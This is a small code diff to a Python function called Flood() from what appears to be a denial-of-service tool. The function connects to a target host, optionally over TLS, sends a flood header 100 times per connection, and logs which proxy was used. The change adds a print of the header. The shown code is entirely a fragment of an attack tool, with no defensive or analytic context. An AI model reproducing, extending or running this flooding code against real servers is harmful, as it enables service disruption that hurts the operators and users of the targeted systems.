@@ -117,6 +117,7 @@ def Flood():
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             s.connect((targetHost, targetPort))
             for _ in range(100):
+                print(floodHeader)
                 s.send(floodHeader)
             print("Flood sent " + proxy[0] + ":" + proxy[1])
         except socket.error:
